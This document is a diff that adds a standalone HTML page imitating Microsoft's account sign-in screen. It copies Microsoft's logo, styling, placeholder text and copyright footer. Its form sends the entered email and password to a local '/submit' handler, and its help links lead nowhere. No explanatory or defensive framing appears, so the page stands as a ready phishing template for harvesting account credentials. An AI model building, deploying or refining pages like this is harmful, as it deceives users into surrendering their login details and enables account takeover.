@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in to your Microsoft account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background-color: #f3f2f1;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 80px auto;
+            background-color: #ffffff;
+            box-shadow: 0 0 8px rgba(0,0,0,0.2);
+            padding: 40px;
+            border-radius: 8px;
+        }
+        .logo {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .logo img {
+            width: 110px;
+        }
+        h2 {
+            color: #1b1b1b;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #c8c8c8;
+            border-radius: 2px;
+            font-size: 16px;
+        }
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #005a9e;
+        }
+        .link {
+            text-align: left;
+            margin-top: 10px;
+        }
+        .link a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .link a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://logincdn.msauth.net/16.000.32015.2/images/microsoft_logo_ee5f8c1eec0d7a3a9a8e.svg" alt="Microsoft">
+        </div>
+        <h2>Sign in</h2>
+        <p>to continue to Microsoft</p>
+        <form action="/submit" method="POST">
+            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button class="button" type="submit">Sign in</button>
+        </form>
+        <div class="link">
+            <a href="#">Forgot my password</a>
+        </div>
+        <div class="link" style="margin-top: 5px;">
+            <a href="#">Sign in with a security key</a>
+        </div>
+        <div class="footer">
+            © Microsoft 2025
+        </div>
+    </div>
+</body>
+</html>
